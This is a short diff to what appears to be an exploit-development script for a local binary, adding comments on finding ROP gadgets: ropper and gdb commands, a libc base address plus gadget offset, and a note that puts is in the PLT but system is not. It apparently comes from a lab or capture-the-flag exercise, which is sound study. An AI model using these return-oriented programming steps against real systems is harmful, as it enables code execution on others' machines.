@@ -102,3 +102,15 @@ f.write(payload)
 # puts() is in the PLT, but system() is not!
 
 # 0x401030 (puts@plt) -> 0x403fc8 (puts@got.plt) -> 0x7f97af89be10 (puts)
+
+# https://shantoroy.com/security/using-ropper-to-find-address-of-gadgets/
+# https://exitno.de/linux_exploitation/
+# set breakpoint + run binary:
+# info proc map
+# ropper --file /usr/lib/x86_64-linux-gnu/libc-2.33.so --search 'push rsp'
+
+# base libc: 0x7ffff7dd6000
+# + gadget: 0x000000000003bb99
+# = 7FFFF7E11B99
+# x/2i 0x7FFFF7E11B99
+# works!
